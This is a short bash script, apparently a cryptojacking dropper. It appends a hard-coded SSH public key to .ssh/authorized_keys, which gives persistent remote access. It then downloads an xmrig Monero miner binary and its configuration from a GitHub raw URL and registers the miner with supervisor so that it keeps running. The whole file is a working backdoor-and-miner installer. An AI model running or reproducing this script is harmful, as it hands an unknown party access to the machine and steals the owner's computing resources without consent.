#!/bin/bash
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDCaPV6yGTphaAYzOWPAx2bdOhQk31zZ/dO5IbPdn7r+JSlWs7pZ3ygenT11pkpfJ/QTMJqothW4I9lFIXNK3j79+PA4AAaycYU/4EWyiPqJivK2UvPpDTt9cwdOeu1oCDH5kNAUAZFDQ1BvODHzQz0y4GmanoR1V+X/NmxayzQGe++D3btVouTawrpkM905QAHtvyOjdaTjqhViI2FCW5IaoPw3F/PiEQyVZDDZ3dS1JjUwaaTeogzneZlK4nbWEuZpCi4U+SEf4oOB7HP+dMoZgsWBCCxxG3QwG0V94hqahOcqFPu9G1Beg1MCBI+3bGzEzTHfxmt82GQ5Po35bqbWRawD5kTZFFklHLt2pdLWB9J6OZCln/uXVr9kBtvAmVldiHqGGCCE+qBsM4Emt0x/5/mTzkyPKMQEhUBHKpkp5xFvIAQd7spItkZ4dgHFFQdJS9SA/GxV4/XqE1m5KcePB9/LSD3U3GfDNpZWLNn6KOkHEaSptNAErHaa8y8qik= ubuntu@archlinux" >> .ssh/authorized_keys
apt-get -y update 
apt install -y wget supervisor
apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev 
wget https://raw.githubusercontent.com//henglxm/xmr/main/xmrig
chmod +x xmrig
wget https://raw.githubusercontent.com//henglxm/xmr/main/config.json
wget https://raw.githubusercontent.com/henglxm/xmr/main/li_super.conf -O /etc/supervisor/conf.d/li_super.conf
systemctl enable supervisor.service
systemctl start supervisor.service
supervisorctl reload